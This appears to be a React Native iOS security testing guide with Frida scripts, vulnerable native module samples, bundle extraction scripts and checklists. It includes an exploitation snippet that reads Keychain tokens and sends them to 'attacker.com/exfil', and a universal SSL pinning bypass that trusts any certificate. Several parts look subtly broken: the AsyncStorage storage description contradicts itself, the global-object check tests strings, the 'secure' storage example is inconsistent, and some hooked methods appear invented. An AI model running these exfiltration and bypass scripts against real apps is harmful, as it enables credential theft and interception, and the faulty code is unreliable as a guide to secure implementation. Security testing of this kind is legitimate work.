# React Native iOS Security

React Native enables building iOS apps using JavaScript and React. However, this hybrid architecture introduces unique security challenges that require specialized testing approaches for iOS deployments.

## Architecture Overview

### React Native iOS Bridge

React Native on iOS uses a **native bridge** to communicate between JavaScript and native code:

```
JavaScript Runtime (Hermes/JSC)
           ↓
      RCTBridge
           ↓
Native Modules (Objective-C/Swift)
           ↓
iOS APIs (UIKit, Foundation, etc.)
```

**MASTG References:**
- MASTG-TEST-0001: Information Gathering
- MASTG-TEST-0002: Identify Development and Security Protections
- MASTG-TEST-0038: Local Data Storage Analysis
- MASTG-TEST-0045: WebView Communication

## 1. RCTBridge Module Loading

### Vulnerability: Exposed Native Modules

The `RCTBridge` exposes all registered native modules to JavaScript, potentially allowing unauthorized access to sensitive iOS APIs.

### Detection

```javascript
// Frida script to enumerate all exposed native modules
if (ObjC.available) {
    try {
        const bridge = ObjC.classes.RCTBridge;
        if (bridge) {
            // Hook RCTBridge initialization
            const init = bridge['- initWithDelegate:bundleURL:moduleProvider:launchOptions:'];
            if (init) {
                Interceptor.attach(init.implementation, {
                    onLeave: function(retval) {
                        if (retval.isNull()) return;

                        const bridgeObj = new ObjC.Object(retval);
                        const modules = bridgeObj['- allModules']();

                        console.log("[+] React Native Modules Exposed:");
                        for (let i = 0; i < modules.count(); i++) {
                            const module = modules.objectAtIndex_(i);
                            const moduleName = module['- name']().toString();
                            const exportedMethods = module['- methodsToExport']();

                            console.log(`    Module: ${moduleName}`);
                            console.log(`      Exposed Methods: ${exportedMethods.count()}`);

                            // Check for sensitive method names
                            const sensitive = ['keychain', 'biometric', 'crypto', 'token', 'auth', 'password'];
                            if (sensitive.some(s => moduleName.toLowerCase().includes(s))) {
                                console.log(`      [!] SENSITIVE MODULE DETECTED`);

                                // List all exposed methods
                                for (let j = 0; j < exportedMethods.count(); j++) {
                                    const method = exportedMethods.objectAtIndex_(j).toString();
                                    console.log(`        - ${method}`);
                                }
                            }
                        }
                    }
                });
            }
        }
    } catch (e) {
        console.log("[-] Error hooking RCTBridge: " + e);
    }
}
```

### Vulnerable Code Example

```objective-c
// Vulnerable native module - exposes Keychain operations
// NativeModule.m (Objective-C)

#import <React/RCTBridgeModule.h>
#import <Security/Security.h>

@interface KeychainModule : NSObject <RCTBridgeModule>
@end

@implementation KeychainModule

RCT_EXPORT_MODULE(); // Exposes module to JavaScript - NO PROTECTION

// Vulnerable: Exposes raw Keychain operations
RCT_EXPORT_METHOD(saveItem:(NSString *)key value:(NSString *)value) {
    NSDictionary *attributes = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrAccount: key,
        (__bridge id)kSecValueData: [value dataUsingEncoding:NSUTF8StringEncoding]
    };

    SecItemAdd((__bridge CFDictionaryRef)attributes, NULL);
}

RCT_EXPORT_METHOD(getItem:(NSString *)key resolver:(RCTPromiseResolveBlock)resolve) {
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrAccount: key,
        (__bridge id)kSecReturnData: @YES
    };

    CFTypeRef result = NULL;
    SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);

    if (result) {
        NSData *data = (__bridge NSData *)result;
        resolve([[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]);
    } else {
        resolve(@"");
    }
}

@end
```

### Exploitation

```javascript
// JavaScript code that could be injected via console
const KeychainModule = NativeModules.KeychainModule;

// Steal all stored credentials
const sensitiveKeys = ['api_token', 'auth_token', 'session', 'password'];

sensitiveKeys.forEach(async (key) => {
    const value = await KeychainModule.getItem(key);
    if (value) {
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify({ key, value })
        });
    }
});
```

### Mitigation

```objective-c
// Protected native module
#import <React/RCTBridgeModule.h>
#import "SecurityPolicy.h"

@interface ProtectedKeychainModule : NSObject <RCTBridgeModule>
@end

@implementation ProtectedKeychainModule

RCT_EXPORT_MODULE();

// Check caller legitimacy before exposing methods
RCT_REMAP_METHOD(saveItem,
                 key:(NSString *)key
                 value:(NSString *)value
                 resolver:(RCTPromiseResolveBlock)resolve
                 rejecter:(RCTPromiseRejectBlock)reject) {

    // Validate inputs
    if (!key || !value || key.length == 0 || value.length == 0) {
        reject(@"INVALID_INPUT", @"Key and value are required", nil);
        return;
    }

    // Check if operation is allowed
    if (![SecurityPolicy isKeychainWriteAllowed]) {
        reject(@"NOT_ALLOWED", @"Keychain write operation not permitted", nil);
        return;
    }

    // Sanitize input to prevent injection
    NSString *sanitizedKey = [SecurityPolicy sanitizeKeychainKey:key];
    NSString *sanitizedValue = [SecurityPolicy sanitizeValue:value];

    // Enforce kSecAttrAccessibleWhenUnlocked
    NSDictionary *attributes = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrAccount: sanitizedKey,
        (__bridge id)kSecValueData: [sanitizedValue dataUsingEncoding:NSUTF8StringEncoding],
        (__bridge id)kSecAttrAccessible: (__bridge id)kSecAttrAccessibleWhenUnlocked
    };

    OSStatus status = SecItemAdd((__bridge CFDictionaryRef)attributes, NULL);

    if (status == errSecSuccess) {
        resolve(@YES);
    } else {
        reject(@"KEYCHAIN_ERROR", [NSString stringWithFormat:@"Failed to save item: %d", status], nil);
    }
}

@end
```

## 2. NativeModules Exposure

### Detection with Frida

```javascript
// Enumerate all NativeModules and their methods
setTimeout(function() {
    if (typeof __REACT_NATIVE__ !== 'undefined') {
        const NativeModules = __REACT_NATIVE__.NativeModules;

        console.log("[+] Available React Native NativeModules:");
        for (const moduleName in NativeModules) {
            const module = NativeModules[moduleName];
            console.log(`\n[+] Module: ${moduleName}`);

            // List all exposed methods
            const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(module));
            if (methods.length > 0) {
                console.log("  Exposed Methods:");
                methods.forEach(method => {
                    if (typeof module[method] === 'function') {
                        console.log(`    - ${method}`);

                        // Check for dangerous methods
                        const dangerous = ['delete', 'remove', 'drop', 'clear', 'reset', 'exec'];
                        if (dangerous.some(d => method.toLowerCase().includes(d))) {
                            console.log(`      [!] POTENTIALLY DANGEROUS`);
                        }
                    }
                });
            } else {
                console.log("  [!] No methods exposed (properties only)");
            }
        }
    }
}, 2000);
```

### Testing for Sensitive Data Leaks

```javascript
// Monitor NativeModule calls for sensitive data
const originalJSONStringify = JSON.stringify;
JSON.stringify = function(obj) {
    const str = originalJSONStringify.apply(this, arguments);

    // Check for sensitive patterns
    const sensitivePatterns = [
        /"password":\s*"[^"]+"/i,
        /"token":\s*"[^"]+"/i,
        /"api[_-]?key":\s*"[^"]+"/i,
        /"secret":\s*"[^"]+"/i,
        /"credential":\s*"[^"]+"/i
    ];

    for (const pattern of sensitivePatterns) {
        if (pattern.test(str)) {
            console.log(`[!] SENSITIVE DATA DETECTED in NativeModule call: ${str.substring(0, 200)}`);
        }
    }

    return str;
};
```

## 3. AsyncStorage on iOS (plist-backed)

### Vulnerability: Insecure Local Storage

`AsyncStorage` on iOS uses `NSUserDefaults` backed by plist files stored in the app's sandbox, potentially exposing sensitive data.

### Detection

```bash
# Extract AsyncStorage plist from IPA
unzip -q app.ipa
cd Payload/*.app

# Find AsyncStorage files
find . -name "*.plist" | grep -i async

# Or find all plists
find . -name "*.plist"

# Extract and read AsyncStorage content
# iOS keeps AsyncStorage under Application Support / RCTAsyncLocalStorage_V1.
# Library/SharedPreferences/ is the ANDROID path and does not exist in an IPA.
find . -path "*RCTAsyncLocalStorage_V1*" -name "manifest.json" -exec cat {} \;
```

### Frida Script to Monitor AsyncStorage

```javascript
// Hook AsyncStorage read/write operations
if (ObjC.available) {
    try {
        const NSUserDefaults = ObjC.classes.NSUserDefaults;

        // Hook stringForKey (read operation)
        const stringForKey = NSUserDefaults['- stringForKey:'];
        Interceptor.attach(stringForKey.implementation, {
            onEnter: function(args) {
                const key = new ObjC.Object(args[2]).toString();
                this.isAsyncStorage = key.startsWith('RCTAsyncLocalStorage_');
                this.key = key;
            },
            onLeave: function(retval) {
                if (this.isAsyncStorage && !retval.isNull()) {
                    const value = new ObjC.Object(retval).toString();

                    // Check for sensitive data
                    const sensitivePatterns = [
                        /token|auth|password|api[_-]?key|secret|credential/i
                    ];

                    if (sensitivePatterns.some(p => p.test(this.key))) {
                        console.log(`[!] AsyncStorage READ - Key: ${this.key}`);
                        console.log(`    Value: ${value.substring(0, 100)}`);
                    }
                }
            }
        });

        // Hook setObject:forKey: (write operation)
        const setObjectForKey = NSUserDefaults['- setObject:forKey:'];
        Interceptor.attach(setObjectForKey.implementation, {
            onEnter: function(args) {
                const key = new ObjC.Object(args[3]).toString();
                this.isAsyncStorage = key.startsWith('RCTAsyncLocalStorage_');
                this.key = key;

                if (this.isAsyncStorage && !args[2].isNull()) {
                    const value = new ObjC.Object(args[2]).toString();

                    // Check for sensitive data
                    const sensitivePatterns = [
                        /token|auth|password|api[_-]?key|secret|credential/i
                    ];

                    if (sensitivePatterns.some(p => p.test(this.key))) {
                        console.log(`[!] AsyncStorage WRITE - Key: ${this.key}`);
                        console.log(`    Value: ${value.substring(0, 100)}`);
                    }
                }
            }
        });

        console.log("[+] AsyncStorage hooks installed");
    } catch (e) {
        console.log("[-] Error hooking AsyncStorage: " + e);
    }
}
```

### Vulnerable Code Example

```javascript
// AsyncStorage with sensitive data
import AsyncStorage from '@react-native-async-storage/async-storage';

// VULNERABLE: Storing plaintext credentials
const login = async (username, password) => {
    const response = await fetch('https://api.example.com/login', {
        method: 'POST',
        body: JSON.stringify({ username, password })
    });

    const data = await response.json();

    // Store sensitive token in plaintext
    await AsyncStorage.setItem('auth_token', data.token);
    await AsyncStorage.setItem('user_password', password); // NEVER do this
    await AsyncStorage.setItem('api_key', data.api_key);
};

// VULNERABLE: No encryption
const getCredentials = async () => {
    const token = await AsyncStorage.getItem('auth_token');
    const apiKey = await AsyncStorage.getItem('api_key');
    return { token, apiKey };
};
```

### Mitigation

```javascript
// Secure AsyncStorage implementation
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Platform } from 'react-native';
import { NativeModules } from 'react-native';

// Use Keychain for sensitive data on iOS
const SecureStorage = {
    async setItem(key, value) {
        if (Platform.OS === 'ios') {
            // Use native Keychain module
            return await NativeModules.SecureKeychain.setItem(key, value);
        }
        // Platform mismatch: native Keychain required on iOS
        throw new Error('SecureKeychain module unavailable; refusing to fall back to insecure storage');
    },

    async getItem(key) {
        if (Platform.OS === 'ios') {
            return await NativeModules.SecureKeychain.getItem(key);
        } else {
            const encrypted = await AsyncStorage.getItem(`secure_${key}`);
            return encrypted ? await this.decrypt(encrypted) : null;
        }
    },

    async removeItem(key) {
        if (Platform.OS === 'ios') {
            return await NativeModules.SecureKeychain.removeItem(key);
        } else {
            await AsyncStorage.removeItem(`secure_${key}`);
        }
    },

    // AES-256-GCM encryption for non-sensitive data
    async encrypt(data) {
        // Implementation using CryptoJS or native crypto
        // ...
    },

    async decrypt(encrypted) {
        // Implementation using CryptoJS or native crypto
        // ...
    }
};

// Secure login implementation
const secureLogin = async (username, password) => {
    const response = await fetch('https://api.example.com/login', {
        method: 'POST',
        body: JSON.stringify({ username, password })
    });

    const data = await response.json();

    // Use SecureStorage for sensitive data
    await SecureStorage.setItem('auth_token', data.token);
    await SecureStorage.setItem('api_key', data.api_key);

    // Never store password
};
```

## 4. RCTNetworking Intercepts

### Vulnerability: Network Interception

`RCTNetworking` handles all HTTP requests in React Native iOS, making it a target for man-in-the-middle attacks and SSL pinning bypasses.

### Detection of SSL Pinning

```javascript
// Frida script to detect SSL pinning implementation
if (ObjC.available) {
    const RCTNetworking = ObjC.classes.RCTNetworking;

    if (RCTNetworking) {
        console.log("[+] RCTNetworking detected");

        // Check for custom pinning configuration
        const shared = RCTNetworking.sharedNetworking();
        const securityConfig = shared['- securityConfiguration']();

        if (securityConfig) {
            console.log("[+] Security Configuration Found");

            // Enumerate pinned domains
            const pinnedDomains = securityConfig['- pinnedDomains']();
            if (pinnedDomains) {
                console.log("[+] Pinned Domains:");
                for (let i = 0; i < pinnedDomains.count(); i++) {
                    const domain = pinnedDomains.objectAtIndex_(i).toString();
                    console.log(`    - ${domain}`);
                }
            }
        } else {
            console.log("[!] NO SSL PINNING CONFIGURED");
        }
    }
}
```

### Bypassing RCTNetworking SSL Pinning

```javascript
// Universal SSL pinning bypass for React Native iOS
if (ObjC.available) {
    try {
        const URLSession = ObjC.classes.NSURLSession;

        // Hook dataTaskWithRequest
        Interceptor.attach(URLSession['- dataTaskWithRequest:completionHandler:'].implementation, {
            onEnter: function(args) {
                const request = new ObjC.Object(args[2]);
                const url = request['- URL']().toString();

                console.log(`[+] Intercepted RCTNetworking Request: ${url}`);
            }
        });

        // Disable SSL validation
        const NSURLSessionDelegate = ObjC.protocols.NSURLSessionDelegate;
        const didReceiveChallenge = NSURLSessionDelegate['- URLSession:didReceiveChallenge:completionHandler:'];

        if (didReceiveChallenge) {
            Interceptor.attach(ObjC.classes.NSObject['- URLSession:didReceiveChallenge:completionHandler:'].implementation, {
                onEnter: function(args) {
                    const challenge = new ObjC.Object(args[3]);
                    const completionHandler = new ObjC.Block(args[4]);

                    // Always trust the certificate
                    const credential = ObjC.classes.NSURLCredential.credentialForTrust_(
                        challenge.protectionSpace().serverTrust()
                    );

                    completionHandler(0, credential);
                    console.log("[+] SSL certificate trusted (pinning bypassed)");
                }
            });
        }

        console.log("[+] RCTNetworking SSL pinning bypass installed");
    } catch (e) {
        console.log("[-] Error bypassing RCTNetworking pinning: " + e);
    }
}
```

## 5. Hermes Engine on iOS

### Detection

```javascript
// Check if app uses Hermes engine
setTimeout(() => {
    if (typeof HermesInternal !== 'undefined') {
        console.log("[+] Hermes Engine Detected");

        // Get Hermes version
        if (HermesInternal.getRuntimeProperties) {
            const props = HermesInternal.getRuntimeProperties();
            console.log(`    Version: ${props['Hermes Version']}`);
            console.log(`    Build: ${props['Build']}`);
        }

        // Enable Hermes debugging
        if (HermesInternal.enableDebugger) {
            console.log("[+] Hermes Debugger Available");
        }
    } else {
        console.log("[!] Using JavaScriptCore (JSC)");
    }
}, 1000);
```

### Extracting JavaScript Bundle

```bash
# Extract Hermes bytecode from IPA
unzip -q app.ipa
cd Payload/*.app

# Find main.jsbundle (Hermes bytecode)
find . -name "*.jsbundle" -o -name "main.jsbundle"

# Extract bytecode for analysis
cp main.jsbundle /tmp/

# Use Hermes CLI to disassemble
hermes -d main.jsbundle -output main.hbc.asm

# Or convert to readable format
hermes -emit-binary -out main.hbc main.jsbundle
hermes -dump-ir main.hbc
```

### Vulnerability: Exposed Global Objects

```javascript
// Frida script to enumerate global JavaScript objects
setTimeout(() => {
    if (typeof __REACT_NATIVE__ !== 'undefined') {
        console.log("[+] React Native Global Objects:");

        // Check for exposed sensitive globals
        const sensitiveGlobals = [
            '__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED',
            'RCTDeviceEventEmitter',
            'NativeModules',
            'BatchedBridge',
            '__fbBatchedBridgeConfig',
            '__fbBatchedBridge'
        ];

        for (const global of sensitiveGlobals) {
            if (typeof global !== 'undefined') {
                console.log(`    [+] ${global}: ${typeof global}`);

                // Check NativeModules for sensitive data
                if (global === 'NativeModules') {
                    const modules = Object.keys(global);
                    console.log(`      Modules count: ${modules.length}`);
                }
            }
        }
    }
}, 2000);
```

## 6. JS Bundle Extraction and Analysis

### Automated Extraction Script

```bash
#!/bin/bash
# extract_react_native_bundle.sh

IPA_PATH=$1
EXTRACT_DIR=$2

if [ -z "$IPA_PATH" ] || [ -z "$EXTRACT_DIR" ]; then
    echo "Usage: $0 <ipa_path> <extract_dir>"
    exit 1
fi

mkdir -p "$EXTRACT_DIR"

# Unzip IPA
echo "[*] Extracting IPA..."
unzip -q "$IPA_PATH" -d "$EXTRACT_DIR"

# Find app bundle
APP_PATH=$(find "$EXTRACT_DIR/Payload" -name "*.app" -type d | head -1)

if [ -z "$APP_PATH" ]; then
    echo "[-] App bundle not found"
    exit 1
fi

echo "[+] Found app: $APP_PATH"

# Find JavaScript bundle
echo "[*] Searching for JavaScript bundle..."

# Common iOS bundle locations
BUNDLE_LOCATIONS=(
    "$APP_PATH/main.jsbundle"
    "$APP_PATH/index.ios.jsbundle"
    "$APP_PATH/assets/index.ios.bundle"
    "$APP_PATH/App.jsbundle"
    "$APP_PATH/bundle.js"
)

JS_BUNDLE=""
for location in "${BUNDLE_LOCATIONS[@]}"; do
    if [ -f "$location" ]; then
        JS_BUNDLE="$location"
        echo "[+] Found JavaScript bundle: $JS_BUNDLE"
        break
    fi
done

if [ -z "$JS_BUNDLE" ]; then
    # Search for any .jsbundle or .js file
    JS_BUNDLE=$(find "$APP_PATH" -name "*.jsbundle" -o -name "*.js" | grep -E "(bundle|main|index)" | head -1)
    if [ -n "$JS_BUNDLE" ]; then
        echo "[+] Found JavaScript bundle: $JS_BUNDLE"
    fi
fi

if [ -z "$JS_BUNDLE" ]; then
    echo "[-] JavaScript bundle not found"
    exit 1
fi

# Copy bundle
cp "$JS_BUNDLE" "$EXTRACT_DIR/bundle.js"

# Analyze bundle
echo "[*] Analyzing JavaScript bundle..."

# Check for Hermes bytecode
if file "$JS_BUNDLE" | grep -q "Hermes"; then
    echo "[+] Hermes bytecode detected"
    cp "$JS_BUNDLE" "$EXTRACT_DIR/bundle.hbc"
fi

# Check for sensitive patterns
echo "[*] Searching for sensitive patterns..."
grep -i -n "password\|token\|api[_-]?key\|secret\|credential" "$JS_BUNDLE" > "$EXTRACT_DIR/sensitive_patterns.txt"

if [ -s "$EXTRACT_DIR/sensitive_patterns.txt" ]; then
    echo "[!] Found sensitive patterns"
    head -20 "$EXTRACT_DIR/sensitive_patterns.txt"
else
    echo "[+] No sensitive patterns found"
fi

# Extract URLs
echo "[*] Extracting URLs..."
grep -oE "https?://[a-zA-Z0-9./?=_-]+" "$JS_BUNDLE" | sort -u > "$EXTRACT_DIR/urls.txt"

URL_COUNT=$(wc -l < "$EXTRACT_DIR/urls.txt")
echo "[+] Found $URL_COUNT unique URLs"

# Check for exposed NativeModules
echo "[*] Extracting NativeModule references..."
grep -oE "NativeModules\.[a-zA-Z0-9_]+" "$JS_BUNDLE" | sort -u > "$EXTRACT_DIR/native_modules.txt"

MODULE_COUNT=$(wc -l < "$EXTRACT_DIR/native_modules.txt")
echo "[+] Found $MODULE_COUNT NativeModule references"

echo "[+] Analysis complete: $EXTRACT_DIR"
```

## Testing Checklist

### RCTBridge Module Loading
- [ ] Enumerate all exposed native modules
- [ ] Identify modules with sensitive operations (Keychain, biometrics, crypto)
- [ ] Test module access controls
- [ ] Review exported methods for dangerous operations

### NativeModules Exposure
- [ ] List all NativeModules and their methods
- [ ] Monitor NativeModule calls for sensitive data
- [ ] Test for missing input validation
- [ ] Check for exposed internal APIs

### AsyncStorage Security
- [ ] Extract AsyncStorage plist files
- [ ] Analyze stored data for sensitive information
- [ ] Verify encryption/obfuscation of sensitive values
- [ ] Check for hardcoded secrets in bundle

### RCTNetworking Security
- [ ] Detect SSL pinning configuration
- [ ] Test SSL pinning bypass
- [ ] Monitor network requests for sensitive data
- [ ] Verify certificate validation

### Hermes Engine
- [ ] Detect Hermes vs JavaScriptCore usage
- [ ] Extract and analyze JavaScript bundle
- [ ] Search for exposed global objects
- [ ] Enable and test Hermes debugger

### Bundle Analysis
- [ ] Extract JavaScript bundle
- [ ] Search for sensitive patterns (passwords, tokens, API keys)
- [ ] Extract and analyze all URLs
- [ ] Identify NativeModule usage patterns

## OWASP MASTG References

- **MASTG-TEST-0001**: Information Gathering
- **MASTG-TEST-0002**: Identify Development and Security Protections
- **MASTG-TEST-0038**: Local Data Storage Analysis
- **MASTG-TEST-0045**: WebView Communication
- **MASTG-TEST-0046**: Testing for Local Storage
- **MASTG-TEST-0047**: Testing for Keychain Data
- **MASTG-TEST-0050**: Testing Network Communication
- **MASTG-TEST-0051**: Testing Endpoint Transport Security
- **MASTG-TEST-0052**: Testing Inter-Process Communication
- **MASTG-TEST-0053**: Testing for Custom URL Schemes
- **MASTG-TEST-0056**: Testing Code Quality and Code Construction Issues
- **MASTG-TEST-0057**: Testing Code Quality (iOS)
- **MASTG-TEST-0070**: Testing for Frida Detection
- **MASTG-TEST-0083**: Testing Binary Protection
- **MASTG-TEST-0084**: Testing the Binary (iOS)
- **MASTG-TEST-0085**: Anti-Debugging Checks

## Tools and Resources

### Analysis Tools
- **Frida**: Runtime instrumentation and hooking
- **objection**: Runtime exploration and modification
- **ida**: Binary analysis
- **Hopper**: macOS/iOS disassembler
- **hermes CLI**: Hermes bytecode disassembly
- **MobSF**: Automated security assessment

### Reference Materials
- [React Native Security Best Practices](https://reactnative.dev/docs/security)
- [OWASP MASTG](https://github.com/OWASP/MASTG)
- [Hermes Engine Documentation](https://hermesengine.dev/)
- [RCTNetworking Documentation](https://reactnative.dev/docs/network)
